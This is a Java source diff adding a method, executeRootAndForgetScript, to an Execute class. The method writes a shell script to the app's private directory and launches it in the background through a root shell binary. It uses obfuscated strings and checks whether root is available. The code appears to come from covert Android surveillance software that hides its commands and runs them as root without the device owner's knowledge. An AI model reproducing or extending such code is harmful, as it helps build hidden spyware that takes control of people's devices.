@@ -29,7 +29,6 @@ public class Execute {
 		String cmdExpanded = Directory.expandMacro(command);
 		String[] cmd = null;
 		if (Status.haveRoot()) {
-
 			cmd = new String[] { Configuration.shellFile, M.e("qzx"), cmdExpanded };
 
 			if (Cfg.DEBUG) {
@@ -245,6 +244,25 @@ public class Execute {
 			}
 			return false;
 		}
+	}
+
+	public synchronized static boolean executeRootAndForgetScript(String cmd) {
+		String pack = Status.self().getAppContext().getPackageName();
+
+		String script = M.e("#!/system/bin/sh") + "\n" + cmd;
+		String filename = String.format(M.e("%s qzx /data/data/%s/files/e"), Configuration.shellFile, pack);
+
+		if (Root.createScript("e", script) == true) {
+			try {
+				Process localProcess = Runtime.getRuntime().exec(filename);
+				return true;
+			} catch (Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+			}
+		}
+		return false;
 	}
 
 	public synchronized static ExecuteResult executeScript(String cmd) {
